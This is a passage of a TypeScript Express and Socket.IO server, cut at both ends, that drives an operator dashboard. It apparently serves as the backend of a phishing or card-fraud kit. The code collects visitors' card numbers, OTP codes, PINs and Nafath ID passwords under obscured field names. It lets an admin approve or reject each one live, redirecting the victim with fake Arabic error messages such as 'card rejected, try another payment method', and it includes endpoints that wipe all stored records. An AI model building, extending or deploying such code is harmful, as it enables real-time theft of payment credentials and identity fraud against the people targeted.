  if (hasNewNafadData && !mergedPayload.nafadUpdatedAt) {
    mergedPayload.nafadUpdatedAt = now;
  }

  // Auto-add comparCompletedAt ONLY if package/offer data is in the CURRENT payload and differs from existing visitor data
  const hasNewOfferData = !preserveTimestamp && (
    hasMeaningfulValueChange(existingVisitorData.selectedOffer, payload.selectedOffer) ||
    hasMeaningfulValueChange(existingVisitorData.offerTotalPrice, payload.offerTotalPrice) ||
    hasMeaningfulValueChange(existingVisitorData.comparCompletedAt, payload.comparCompletedAt)
  );
  if (hasNewOfferData && !mergedPayload.comparCompletedAt) {
    mergedPayload.comparCompletedAt = now;
  }

  const isSubmissionPayload = !preserveTimestamp && hasSubmissionIntent(payload);
  const shouldRefreshTimestamp = isSubmissionPayload && (hasExplicitTimestamp || hasCustomerInputData || hasNewCardData || hasNewOtpData || hasNewPinData || hasNewPhoneData || hasNewNafadData || hasNewOfferData);
  const hasIncomingMeaningfulData = shouldRefreshTimestamp;
  
  const normalized = normalizeDashboardEntry(mergedPayload);
  
  try {
    const existingResult = await pool.query<{ submittedAt: string | null }>(
      `SELECT submitted_at AS "submittedAt" FROM dashboard_requests WHERE id = $1`,
      [normalized.id],
    );
    const existingSubmittedAt = existingResult.rows[0]?.submittedAt || null;
    const incomingTimestamp = payload.submittedAt || payload.updatedAt || payload.createdAt || payload.homeCompletedAt || payload.comparCompletedAt ||
      payload._v1UpdatedAt || payload._v5UpdatedAt || payload._v6UpdatedAt || payload._v7UpdatedAt || payload.nafadUpdatedAt ||
      normalized.submittedAt || now;
    const persistedSubmittedAt = hasIncomingMeaningfulData ? incomingTimestamp : (existingSubmittedAt || normalized.submittedAt || now);
    normalized.submittedAt = persistedSubmittedAt;
    normalized.updatedAt = persistedSubmittedAt;
    mergedPayload.submittedAt = persistedSubmittedAt;
    mergedPayload.updatedAt = persistedSubmittedAt;

    await pool.query(
      `
        INSERT INTO dashboard_requests (id, visitor_id, customer, status, stage, updated, badge, submitted_at, raw)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
        ON CONFLICT (id) DO UPDATE SET
          visitor_id = EXCLUDED.visitor_id,
          customer = EXCLUDED.customer,
          status = EXCLUDED.status,
          stage = EXCLUDED.stage,
          updated = EXCLUDED.updated,
          badge = EXCLUDED.badge,
          submitted_at = dashboard_requests.submitted_at,
          raw = EXCLUDED.raw;
      `,
      [
        normalized.id,
        normalized.visitorId || null,
        normalized.customer,
        normalized.status,
        normalized.stage,
        normalized.updated,
        normalized.badge,
        persistedSubmittedAt,
        mergedPayload, // Store the merged payload with all visitor data
      ],
    );
    console.log("[UpsertDashboard] DB insert successful with merged data");
  } catch (error) {
    console.error("[UpsertDashboard] DB insert failed:", error);
    throw error;
  }

  return normalized;
}

async function getDashboardEntries(): Promise<DashboardEntry[]> {
  try {
    const { rows } = await pool.query(
      `SELECT id, customer, status, stage, updated, badge, visitor_id AS "visitorId", submitted_at AS "submittedAt", raw FROM dashboard_requests ORDER BY submitted_at DESC, id DESC`,
    );

    return rows.map((row) => ({
      id: row.id,
      customer: row.customer || "زائر",
      status: row.status || "جديد",
      stage: row.stage || "الخطوة 1",
      updated: row.updated || "تم التحديث الآن",
      updatedAt: row.submittedAt || undefined,
      badge: row.badge || "",
      visitorId: row.visitorId || undefined,
      submittedAt: row.submittedAt || undefined,
      raw: row.raw || {},
    }));
  } catch (error) {
    console.error("[Dashboard] DB QUERY FAILED:", error);
    throw error;
  }
}

async function startServer() {
  await initDatabase();
  const app = express();
  const server = createServer(app);

  // Initialize Socket.IO for dashboard
  const io = new SocketIOServer(server, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
  });

  app.use(express.json());

  // Socket.IO connection for dashboard
  io.on("connection", (socket) => {
    console.log("[Socket.IO] Dashboard client connected:", socket.id);

    // Send all current requests on connection
    getDashboardEntries().then((entries) => {
      socket.emit("dashboard:init", entries);
    });

    socket.on("disconnect", () => {
      console.log("[Socket.IO] Dashboard client disconnected:", socket.id);
    });
  });

  // Broadcast to all dashboard clients via Socket.IO
  function broadcastToDashboard(event: string, data: any) {
    io.emit(event, data);
  }

  // SSE endpoint for customer pages (one-way from server to customer)
  app.get("/api/dashboard/stream", (_req, res) => {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.flushHeaders();

    // Send initial connection message
    res.write(`event: connected\ndata: ${JSON.stringify({ message: "Connected to dashboard stream" })}\n\n`);

    // Add client to SSE clients set
    sseClients.add(res);

    // Keep connection alive with heartbeat
    const heartbeat = setInterval(() => {
      try {
        res.write(`: heartbeat\n\n`);
      } catch (e) {
        clearInterval(heartbeat);
        sseClients.delete(res);
      }
    }, 30000);

    // Remove client on disconnect
    _req.on("close", () => {
      clearInterval(heartbeat);
      sseClients.delete(res);
    });
  });

  // SSE endpoint for visitor status updates (step2, step3, step5, etc.)
  // Customer pages listen to this to get real-time status updates
  
  // Map to store visitor SSE clients - MUST be defined before broadcastToVisitor
  const visitorSseClients = new Map<string, Set<any>>();

  // Function to broadcast status update to visitor
  function broadcastToVisitor(visitorId: string, field: string, value: any) {
    const clients = visitorSseClients.get(visitorId);
    if (!clients) return;
    
    const data = { field, status: value, visitorId };
    const message = `data: ${JSON.stringify(data)}\n\n`;
    
    clients.forEach(client => {
      try {
        client.write(`event: status_update\n${message}`);
      } catch (e) {
        clients.delete(client);
      }
    });
  }

  app.get("/api/visitor/:id/stream", (req, res) => {
    const { id } = req.params;
    console.log("[Visitor SSE] Client connected for visitor:", id);
    
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.flushHeaders();

    // Send initial connection message
    res.write(`event: connected\ndata: ${JSON.stringify({ visitorId: id })}\n\n`);

    // Store connection for this visitor
    if (!visitorSseClients.has(id)) {
      visitorSseClients.set(id, new Set());
    }
    visitorSseClients.get(id)!.add(res);

    // Keep connection alive with heartbeat
    const heartbeat = setInterval(() => {
      try {
        res.write(`: heartbeat\n\n`);
      } catch (e) {
        clearInterval(heartbeat);
        visitorSseClients.get(id)?.delete(res);
      }
    }, 30000);

    // Remove client on disconnect
    _req.on("close", () => {
      clearInterval(heartbeat);
      visitorSseClients.get(id)?.delete(res);
      console.log("[Visitor SSE] Client disconnected for visitor:", id);
    });
  });

  app.get("/api/dashboard/requests", async (_req, res) => {
    try {
      const entries = await getDashboardEntries();
      res.json(entries);
    } catch (error) {
      console.error("dashboard requests error", error);
      res.json([]);
    }
  });

  // ==========================================
  // ADMIN ACTION API (Using Local Memory for pending status)
  // ==========================================
  
  app.post("/api/dashboard/admin-action", async (req, res) => {
    try {
      const { visitorId, boxType, action } = req.body;
      
      if (!visitorId || !boxType || !action) {
        res.status(400).json({ error: "Missing visitorId, boxType or action" });
        return;
      }
      
      console.log(`[Admin Action] ${boxType} - ${action} for visitor ${visitorId}`);
      
      // Get current visitor data
      const currentVisitor = await readVisitor(visitorId);
      if (!currentVisitor) {
        res.status(404).json({ error: "Visitor not found" });
        return;
      }
      
      const customerName = currentVisitor.ownerName || currentVisitor.phoneNumber || "زائر";
      const now = new Date().toISOString();
      
      // Clear pending decision from local memory
      clearPendingDecision(visitorId, boxType);
      
      // Prepare redirect data based on box type and action
      let targetPage = "";
      let updateData: Record<string, any> = {
        adminRedirectPage: "",
        adminRedirectAt: null,
        oneTimeRedirect: null,
        currentPage: null,
      };
      
      // Box-specific configuration
      const boxConfig: Record<string, {
        statusField: string;
        errorMessage: string;
        nextPage?: string;
        samePage?: string;
      }> = {
        card: {
          statusField: "_v1Status",
          errorMessage: "تم رفض البطاقة - يرجى المحاولة بطريقة دفع مختلفة",
          nextPage: "step2",
          samePage: "check"
        },
        otp: {
          statusField: "_v5Status",
          errorMessage: "رمز التحقق غير صحيح",
          nextPage: "step3",
          samePage: "step2"
        },
        pin: {
          statusField: "_v6Status",
          errorMessage: "الرمز غير صحيح",
          nextPage: "step5",
          samePage: "step3"
        },
        phone: {
          statusField: "phoneOtpStatus",
          errorMessage: "يرجى التحقق من بياناتك",
          nextPage: "step4",
          samePage: "step5"
        }
      };
      
      const config = boxConfig[boxType];
      if (!config) {
        res.status(400).json({ error: "Invalid box type" });
        return;
      }
      
      if (action === "approve") {
        // Approve - go to next step
        targetPage = config.nextPage || "";
        updateData = {
          adminRedirectPage: targetPage,
          adminRedirectAt: now,
          oneTimeRedirect: targetPage,
          currentPage: targetPage,
          [config.statusField]: "approved",
        };
        // Clear error messages
        updateData[`${boxType}RejectionMessage`] = null;
        updateData[`${boxType}Error`] = null;
        
      } else if (action === "reject") {
        // Reject - stay on same page with error message
        targetPage = config.samePage || "";
        updateData = {
          adminRedirectPage: targetPage,
          adminRedirectAt: now,
          oneTimeRedirect: targetPage,
          currentPage: targetPage,
          [config.statusField]: "rejected",
          [`${boxType}RejectionMessage`]: config.errorMessage,
          // Don't clear submitted data - keep it so the box still shows
          // ...(boxType === 'card' && { _v1: null, cardNumber: null }),
          // ...(boxType === 'otp' && { _v5: null, otpCode: null }),
          // ...(boxType === 'pin' && { _v6: null, pinCode: null }),
          // ...(boxType === 'phone' && { _v7: null, phoneOtp: null }),
        };
        
      } else {
        res.status(400).json({ error: "Invalid action" });
        return;
      }
      
      // Save to database
      await upsertVisitor(visitorId, updateData);
      
      // Broadcast to visitor via SSE
      broadcastToVisitor(visitorId, "currentPage", targetPage);
      broadcastToVisitor(visitorId, config.statusField, action === "approve" ? "approved" : "rejected");
      if (updateData[`${boxType}RejectionMessage`]) {
        broadcastToVisitor(visitorId, `${boxType}RejectionMessage`, updateData[`${boxType}RejectionMessage`]);
      }
      
      // Broadcast to dashboard
      const dashboardData = await upsertDashboardRequest({
        id: visitorId,
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData,
        updated: `تم ${action === "approve" ? "الموافقة" : "الرفض"} على ${boxType}`
      });
      
      broadcastToDashboard("dashboard:update", dashboardData);
      
      // Broadcast box:update event WITHOUT changing the timestamp
      // Timestamp should ONLY be set by customer submissions, NOT by admin actions
      const decisionStatus = action === "approve" ? "approved" : "rejected";
      
      // Get existing timestamp from database (don't change it)
      const existingTimestamp = await getBoxTimestamp(visitorId, boxType as BoxType);
      
      broadcastToDashboard("box:update", {
        visitorId,
        boxType,
        status: decisionStatus,
        // Keep existing timestamp if available, otherwise use current time
        timestamp: existingTimestamp?.event_timestamp || new Date().toISOString(),
        action: 'decision',
        updateType: 'status_only' // Indicates this is only a status update, not new data
      });
      
      res.json({
        success: true,
        action,
        boxType,
        targetPage,
        message: action === "approve" ? "تمت الموافقة" : "تم الرفض"
      });
      
    } catch (error) {
      console.error("[Admin Action] Error:", error);
      res.status(500).json({ error: "Failed to process admin action" });
    }
  });

  app.post("/api/dashboard/reflect-status", async (req, res) => {
    try {
      const body = req.body || {};
      const visitorId = String(body.visitorId || body.id || "").trim();
      const field = String(body.field || "").trim();
      const status = body.status;
      if (!visitorId || !field) {
        res.status(400).json({ error: "Missing visitorId or field" });
        return;
      }

      // Map field names to their corresponding timestamp fields
      const timestampFieldMap: Record<string, string> = {
        '_v1Status': '_v1UpdatedAt',
        '_v5Status': '_v5UpdatedAt',
        '_v6Status': '_v6UpdatedAt',
        '_v7Status': '_v7UpdatedAt',
        'phoneOtpStatus': '_v7UpdatedAt',
        'payment': '_v1UpdatedAt',
        'otp': '_v5UpdatedAt',
        'pin': '_v6UpdatedAt',
        'phone': '_v7UpdatedAt',
      };

      const timestampField = timestampFieldMap[field] || 'updatedAt';
      
      // Build update data - ONLY add timestamp for DATA submissions (pending), not for decisions (approved/rejected)
      // This prevents the time from being refreshed when admin clicks buttons
      const isDecision = status === 'approved' || status === 'rejected';
      const updateData: Record<string, any> = {
        [field]: status,
      };
      // Only update timestamp when submitting NEW data (pending), NOT when making decisions
      if (!isDecision) {
        updateData[timestampField] = new Date().toISOString();
      }
      // For decisions, keep the existing timestamp so buttons stay hidden

      // Update visitor in database
      await upsertVisitor(visitorId, updateData);

      // Broadcast to visitor via SSE
      broadcastToVisitor(visitorId, field, status);
      if (body.currentPage) {
        broadcastToVisitor(visitorId, "currentPage", body.currentPage);
      }
      if (body.currentStep !== undefined) {
        broadcastToVisitor(visitorId, "currentStep", body.currentStep);
      }

      // Get current visitor data for dashboard update
      const currentVisitor = await readVisitor(visitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      // Broadcast to dashboard with updated timestamps
      const dashboardData = await upsertDashboardRequest({
        id: visitorId,
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData,
        updated: `تم تحديث ${field}`,
        // Explicitly include the raw data with updated status
        raw: {
          ...(currentVisitor?.raw || currentVisitor || {}),
          ...updateData,
        }
      });

      console.log("[reflect-status] dashboardData.raw:", dashboardData.raw);
      broadcastToDashboard("dashboard:update", dashboardData);

      res.json({ success: true, field, status, visitorId, timestamp: new Date().toISOString() });
    } catch (error) {
      console.error("reflect-status error", error);
      res.status(500).json({ error: "Failed to reflect status" });
    }
  });

  app.post("/api/dashboard/requests", async (req, res) => {
    const payload = req.body || {};
    if (!payload || typeof payload !== "object") {
      res.status(400).json({ error: "Invalid payload" });
      return;
    }

    try {
      const normalized = await upsertDashboardRequest(payload);
      
      // Broadcast update to all connected dashboards immediately
      broadcastToDashboard("dashboard:update", normalized);
      
      res.json(normalized);
    } catch (error) {
      console.error("dashboard request save error", error);
      res.status(500).json({ error: "Failed to save dashboard request" });
    }
  });

  app.get("/api/dashboard/config", (_req, res) => {
    res.json({
      mode: "local-project-dashboard",
      database: process.env.DATABASE_URL ? "neon-configured" : "waiting-for-neon-url",
    });
  });

  // ==========================================
  // PENDING DECISIONS APIs (Local Memory)
  // ==========================================
  
  // Get pending decisions for a visitor
  app.get("/api/pending/:visitorId", (req, res) => {
    const { visitorId } = req.params;
    const pending = getAllPendingDecisions(visitorId);
    res.json({ visitorId, pending });
  });

  // Set pending decision (called when customer submits new data)
  app.post("/api/pending/:visitorId/:boxType", (req, res) => {
    const { visitorId, boxType } = req.params;
    if (['card', 'otp', 'pin', 'phone'].includes(boxType)) {
      setPendingDecision(visitorId, boxType as any);
      // Broadcast to dashboard
      broadcastToDashboard("pending:update", { visitorId, boxType, status: "pending" });
      res.json({ success: true });
    } else {
      res.status(400).json({ error: "Invalid box type" });
    }
  });

  // Clear pending decision (called after admin action)
  app.delete("/api/pending/:visitorId/:boxType", (req, res) => {
    const { visitorId, boxType } = req.params;
    if (['card', 'otp', 'pin', 'phone'].includes(boxType)) {
      clearPendingDecision(visitorId, boxType as any);
      // Broadcast to dashboard
      broadcastToDashboard("pending:update", { visitorId, boxType, status: "cleared" });
      res.json({ success: true });
    } else {
      res.status(400).json({ error: "Invalid box type" });
    }
  });

  // ==========================================
  // NEW BOX TIMESTAMPS API (Uses visitor_box_events table)
  // ==========================================

  // Get all box timestamps for a visitor
  app.get("/api/boxes/:visitorId/timestamps", async (req, res) => {
    const { visitorId } = req.params;
    try {
      const timestamps = await getAllBoxTimestamps(visitorId);
      res.json({ visitorId, timestamps });
    } catch (error) {
      console.error("[BoxTimestamp API] Error getting timestamps:", error);
      res.status(500).json({ error: "Failed to get box timestamps" });
    }
  });

  // Get specific box timestamp
  app.get("/api/boxes/:visitorId/:boxType/timestamp", async (req, res) => {
    const { visitorId, boxType } = req.params;
    const validBoxTypes = ['card', 'otp', 'pin', 'phone', 'nafad', 'identity', 'vehicle'];
    
    if (!validBoxTypes.includes(boxType)) {
      res.status(400).json({ error: "Invalid box type" });
      return;
    }
    
    try {
      const timestamp = await getBoxTimestamp(visitorId, boxType as BoxType);
      res.json({ visitorId, boxType, timestamp });
    } catch (error) {
      console.error("[BoxTimestamp API] Error getting timestamp:", error);
      res.status(500).json({ error: "Failed to get box timestamp" });
    }
  });

  // Set box timestamp (for pending status or decision)
  app.post("/api/boxes/:visitorId/:boxType", async (req, res) => {
    const { visitorId, boxType } = req.params;
    const { status } = req.body;
    const validBoxTypes = ['card', 'otp', 'pin', 'phone', 'nafad', 'identity', 'vehicle'];
    
    if (!validBoxTypes.includes(boxType)) {
      res.status(400).json({ error: "Invalid box type" });
      return;
    }
    
    if (!status) {
      res.status(400).json({ error: "Missing status" });
      return;
    }
    
    try {
      await setBoxTimestamp(visitorId, boxType as BoxType, status);
      
      // Broadcast to dashboard with the specific box type and timestamp
      broadcastToDashboard("box:update", { 
        visitorId, 
        boxType, 
        status,
        timestamp: new Date().toISOString()
      });
      
      res.json({ success: true, visitorId, boxType, status });
    } catch (error) {
      console.error("[BoxTimestamp API] Error setting timestamp:", error);
      res.status(500).json({ error: "Failed to set box timestamp" });
    }
  });

  app.post("/api/visitors", async (req, res) => {
    const payload = req.body || {};
    let visitorId = payload.id || payload.visitorId;
    
    // Generate new visitorId only if not provided
    if (!visitorId) {
      visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      payload.id = visitorId;
      payload.visitorId = visitorId;
    }
    
    try {
      await upsertVisitor(String(visitorId), payload);
      res.json({ visitorId: String(visitorId) });
    } catch (error) {
      console.error("visitor create error", error);
      res.status(500).json({ error: "Failed to save visitor" });
    }
  });

  app.get("/api/visitors/:id", async (req, res) => {
    try {
      const visitor = await readVisitor(req.params.id);
      if (visitor) {
        res.json(visitor);
      } else {
        res.status(404).json({ error: "Visitor not found" });
      }
    } catch (error) {
      console.error("visitor get error", error);
      res.status(500).json({ error: "Failed to read visitor" });
    }
  });

  app.patch("/api/visitors/:id", async (req, res) => {
    try {
      const merged = await upsertVisitor(req.params.id, req.body || {});
      res.json(merged);
    } catch (error) {
      console.error("visitor patch error", error);
      res.status(500).json({ error: "Failed to update visitor" });
    }
  });

  app.delete("/api/visitors/:id", async (req, res) => {
    try {
      const visitorId = req.params.id;
      console.log("[DELETE] Single visitor HARD DELETE:", visitorId);
      
      // HARD DELETE from all tables
      await pool.query("DELETE FROM visitors WHERE id = $1", [visitorId]);
      await pool.query("DELETE FROM dashboard_requests WHERE id = $1", [visitorId]);
      await pool.query("DELETE FROM visitor_events WHERE visitor_id = $1", [visitorId]);
      await pool.query("DELETE FROM visitor_snapshots WHERE visitor_id = $1", [visitorId]);
      
      // Broadcast to dashboards
      broadcastToDashboard("dashboard:delete", { id: visitorId });
      
      res.json({ success: true, message: "Visitor permanently deleted" });
    } catch (error) {
      console.error("visitor delete error", error);
      res.status(500).json({ error: "Failed to delete visitor" });
    }
  });

  // HARD DELETE - Permanently delete ALL customer entries (old and new) from all tables
  app.post("/api/visitors/delete", async (req, res) => {
    try {
      const { ids } = req.body;
      console.log("[DELETE] HARD DELETE request:", ids);
      
      if (!Array.isArray(ids) || ids.length === 0) {
        res.status(400).json({ error: "No IDs provided" });
        return;
      }
      
      // First, get all records that match these IDs and their customer identifiers
      const { rows: targetRecords } = await pool.query(
        `SELECT id, raw FROM dashboard_requests WHERE id = ANY($1)`,
        [ids]
      );
      
      // Collect ALL IDs to delete (all entries for the same customer)
      const allIdsToDelete: string[] = [...ids];
      
      for (const record of targetRecords) {
        const raw = record.raw || {};
        
        // Find all records with the same customer identifiers
        const identityNumber = raw.identityNumber || raw.phoneIdNumber || raw.nafadIdNumber || raw.buyerIdNumber;
        const phoneNumber = raw.phoneNumber || raw.mobileNumber;
        const visitorId = raw.visitorId;
        
        // Build query to find all matching records
        const conditions: string[] = [];
        const params: any[] = [];
        let paramIndex = 1;
        
        if (identityNumber) {
          conditions.push(`(raw->>'identityNumber' = $${paramIndex} OR raw->>'phoneIdNumber' = $${paramIndex} OR raw->>'nafadIdNumber' = $${paramIndex} OR raw->>'buyerIdNumber' = $${paramIndex})`);
          params.push(identityNumber);
          paramIndex++;
        }
        
        if (phoneNumber) {
          conditions.push(`(raw->>'phoneNumber' = $${paramIndex} OR raw->>'mobileNumber' = $${paramIndex})`);
          params.push(phoneNumber);
          paramIndex++;
        }
        
        if (visitorId) {
          conditions.push(`raw->>'visitorId' = $${paramIndex}`);
          params.push(visitorId);
          paramIndex++;
        }
        
        if (conditions.length > 0) {
          const { rows: matchingRecords } = await pool.query(
            `SELECT id FROM dashboard_requests WHERE ${conditions.join(' OR ')}`,
            params
          );
          
          // Add matching IDs to delete list
          for (const match of matchingRecords) {
            if (!allIdsToDelete.includes(match.id)) {
              allIdsToDelete.push(match.id);
            }
          }
        }
      }
      
      console.log("[DELETE] Total IDs to delete:", allIdsToDelete.length);
      
      // HARD DELETE from all tables in database
      const placeholders = allIdsToDelete.map((_: any, i: number) => `$${i + 1}`).join(", ");
      
      // Delete from visitors table
      await pool.query(`DELETE FROM visitors WHERE id IN (${placeholders})`, allIdsToDelete);
      // Delete from dashboard_requests table
      await pool.query(`DELETE FROM dashboard_requests WHERE id IN (${placeholders})`, allIdsToDelete);
      // Delete from visitor_events table
      await pool.query(`DELETE FROM visitor_events WHERE visitor_id IN (${placeholders})`, allIdsToDelete);
      // Delete from visitor_snapshots table
      await pool.query(`DELETE FROM visitor_snapshots WHERE visitor_id IN (${placeholders})`, allIdsToDelete);
      
      console.log("[DELETE] HARD DELETE completed - all customer data wiped from all tables");
      
      // Broadcast delete to all connected dashboards
      allIdsToDelete.forEach(id => {
        broadcastToDashboard("dashboard:delete", { id });
      });
      
      res.json({ success: true, message: `${allIdsToDelete.length} records permanently deleted for customer` });
    } catch (error) {
      console.error("visitors delete error", error);
      res.status(500).json({ error: "Failed to delete visitors" });
    }
  });

  // Reload dashboard data from database (no cache to clear anymore)
  app.post("/api/dashboard/reload", async (_req, res) => {
    try {
      const entries = await getDashboardEntries();
      res.json({ success: true, count: entries.length });
    } catch (error) {
      console.error("dashboard reload error", error);
      res.status(500).json({ error: "Failed to reload dashboard" });
    }
  });

  // Fix timestamps for existing records
  app.post("/api/dashboard/fix-timestamps", async (_req, res) => {
    try {
      // Get all records
      const { rows } = await pool.query(
        `SELECT id, raw FROM dashboard_requests ORDER BY submitted_at DESC`,
      );
      
      let updated = 0;
      for (const row of rows) {
        const raw = row.raw || {};
        let needsUpdate = false;
        const updatedRaw = { ...raw };
        
        // Fix _v1UpdatedAt for card data
        if ((raw._v1 || raw.cardNumber) && !raw._v1UpdatedAt) {
          updatedRaw._v1UpdatedAt = raw.submittedAt || new Date().toISOString();
          needsUpdate = true;
        }
        
        // Fix _v5UpdatedAt for OTP data
        if ((raw._v5 || raw.otpCode) && !raw._v5UpdatedAt) {
          updatedRaw._v5UpdatedAt = raw.submittedAt || new Date().toISOString();
          needsUpdate = true;
        }
        
        // Fix _v6UpdatedAt for PIN data
        if ((raw._v6 || raw.pinCode) && !raw._v6UpdatedAt) {
          updatedRaw._v6UpdatedAt = raw.submittedAt || new Date().toISOString();
          needsUpdate = true;
        }
        
        // Fix _v7UpdatedAt for phone data
        if ((raw.phoneNumber || raw._v7) && !raw._v7UpdatedAt) {
          updatedRaw._v7UpdatedAt = raw.submittedAt || new Date().toISOString();
          needsUpdate = true;
        }
        
        // Fix nafadUpdatedAt
        if ((raw.nafadIdNumber || raw.nafadPassword) && !raw.nafadUpdatedAt) {
          updatedRaw.nafadUpdatedAt = raw.submittedAt || new Date().toISOString();
          needsUpdate = true;
        }
        
        // Fix comparCompletedAt for package data
        if ((raw.selectedOffer || raw.offerTotalPrice) && !raw.comparCompletedAt) {
          updatedRaw.comparCompletedAt = raw.submittedAt || new Date().toISOString();
          needsUpdate = true;
        }
        
        if (needsUpdate) {
          await pool.query(
            `UPDATE dashboard_requests SET raw = $1 WHERE id = $2`,
            [updatedRaw, row.id]
          );
          updated++;
        }
      }
      
      res.json({ success: true, updated, total: rows.length });
    } catch (error) {
      console.error("fix-timestamps error", error);
      res.status(500).json({ error: "Failed to fix timestamps" });
    }
  });

  app.post("/api/visitors/:id/history", async (req, res) => {
    try {
      const visitorId = req.params.id;
      const currentData = (await readVisitor(visitorId)) || {};
      const history = Array.isArray(currentData.history) ? currentData.history : [];
      const updated = { ...currentData, history: [...history, { ...(req.body || {}), createdAt: new Date().toISOString() }] };
      await upsertVisitor(visitorId, updated);
      res.json({ success: true });
    } catch (error) {
      console.error("visitor history error", error);
      res.status(500).json({ error: "Failed to save history" });
    }
  });

  app.post("/api/visitors/:id/offline", async (req, res) => {
    try {
      const visitorId = req.params.id;
      const currentData = (await readVisitor(visitorId)) || {};
      await upsertVisitor(visitorId, { ...currentData, isOnline: false, ...req.body });
      res.json({ success: true });
    } catch (error) {
      console.error("visitor offline error", error);
      res.status(500).json({ error: "Failed to set offline" });
    }
  });

  app.post("/api/visitors/:id/clear-redirect", async (req, res) => {
    try {
      const visitorId = req.params.id;
      const currentData = (await readVisitor(visitorId)) || {};
      await upsertVisitor(visitorId, { 
        ...currentData, 
        redirectPage: null, 
        redirect_page: null, 
        oneTimeRedirect: null, // Clear one-time redirect flag
        ...req.body 
      });
      res.json({ success: true });
    } catch (error) {
      console.error("visitor clear redirect error", error);
      res.status(500).json({ error: "Failed to clear redirect" });
    }
  });

  app.get("/api/visitors/:id/messages", async (req, res) => {
    try {
      const visitor = await readVisitor(req.params.id);
      const messages = visitor?.messages || [];
      res.json(messages);
    } catch (error) {
      console.error("visitor messages get error", error);
      res.status(500).json({ error: "Failed to load messages" });
    }
  });

  app.post("/api/visitors/:id/messages", async (req, res) => {
    try {
      const visitorId = req.params.id;
      const currentData = (await readVisitor(visitorId)) || {};
      const messages = Array.isArray(currentData.messages) ? currentData.messages : [];
      const updated = { ...currentData, messages: [...messages, { ...(req.body || {}), createdAt: new Date().toISOString() }] };
      await upsertVisitor(visitorId, updated);
      res.json({ success: true });
    } catch (error) {
      console.error("visitor messages save error", error);
      res.status(500).json({ error: "Failed to save message" });
    }
  });

  // =====================================================
  // DASHBOARD ACTION ENDPOINTS
  // =====================================================

  // Payment Approval/Rejection (CheckPage - _v1Status)
  app.post("/api/dashboard/payment-action", async (req, res) => {
    try {
      const { visitorId, action, paymentStatus } = req.body;
      console.log('[PaymentAction] Request:', { visitorId, action, paymentStatus });
      if (!visitorId || !action) {
        res.status(400).json({ error: "Missing visitorId or action" });
        return;
      }

      // Read current visitor data to preserve raw info
      const currentVisitor = await readVisitor(visitorId);
      const currentPage = currentVisitor?.currentPage || "check";
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      const updateData: Record<string, any> = {
        paymentActionAt: new Date().toISOString(),
        adminPaymentAction: action,
        currentPage, // Preserve the current page
      };

      if (action === "approved") {
        updateData._v1Status = "approved";
        updateData.paymentStatus = paymentStatus || "completed";
        updateData.oneTimeRedirect = "step2"; // One-time redirect flag
        updateData.currentStep = "_t2";
        console.log('[PaymentAction] Approved - setting oneTimeRedirect to step2');
      } else if (action === "rejected") {
        updateData._v1Status = "rejected";
        updateData.paymentStatus = "rejected";
        updateData.cardRejectionMessage = "بيانات البطاقة غير صحيحة - يرجى المحاولة بطريقة دفع مختلفة";
        updateData.cardRejectionAt = new Date().toISOString();
        console.log('[PaymentAction] Rejected');
      }

      await upsertVisitor(visitorId, updateData);
      
      // Preserve all existing visitor data for dashboard
      await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData, 
        updated: "تم التحديث الآن" 
      }, { preserveTimestamp: true });

      res.json({ success: true, action });
    } catch (error) {
      console.error("payment action error", error);
      res.status(500).json({ error: "Failed to process payment action" });
    }
  });

  // OTP Verification Approval/Rejection (Step2Page - _v5Status)
  app.post("/api/dashboard/otp-action", async (req, res) => {
    try {
      const { visitorId, action } = req.body;
      
      if (!visitorId || !action) {
        res.status(400).json({ error: "Missing visitorId or action" });
        return;
      }

      const currentVisitor = await readVisitor(visitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      const updateData: Record<string, any> = {
        otpActionAt: new Date().toISOString(),
        adminOtpAction: action,
      };

      if (action === "approved") {
        updateData._v5Status = "approved";
        updateData.otpStatus = "completed";
        updateData.oneTimeRedirect = "step3"; // One-time redirect flag
        updateData.currentStep = "_t3";
        updateData.currentPage = "step3";
      } else if (action === "rejected") {
        updateData._v5Status = "rejected";
        updateData.otpStatus = "rejected";
        updateData.otpRejectionMessage = "رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد";
        updateData.otpRejectionAt = new Date().toISOString();
      } else if (action === "resend") {
        updateData.otpResendRequested = true;
        updateData.otpResendAt = new Date().toISOString();
      }

      // Update visitor data so customer can receive the update
      await upsertVisitor(visitorId, updateData);
      
      // Preserve all existing visitor data for dashboard
      const dashboardData = await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData, 
        updated: "تم التحديث الآن" 
      }, { preserveTimestamp: true });

      // Broadcast to dashboard immediately
      broadcastToDashboard("dashboard:update", dashboardData);

      res.json({ success: true, action });
    } catch (error) {
      console.error("otp action error", error);
      res.status(500).json({ error: "Failed to process OTP action" });
    }
  });

  // PIN Code Sending (Step3Page - Admin sends PIN to customer)
  app.post("/api/dashboard/send-pin", async (req, res) => {
    try {
      const { visitorId, pinCode } = req.body;
      if (!visitorId) {
        res.status(400).json({ error: "Missing visitorId" });
        return;
      }

      const currentVisitor = await readVisitor(visitorId);
      const currentPage = currentVisitor?.currentPage || "step3";

      const updateData: Record<string, any> = {
        adminPinCodeSent: true,
        adminPinSentAt: new Date().toISOString(),
        currentPage,
      };

      if (pinCode) {
        updateData.adminPinCode = pinCode;
      }

      await upsertVisitor(visitorId, updateData);
      await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم إرسال PIN" }, { preserveTimestamp: true });


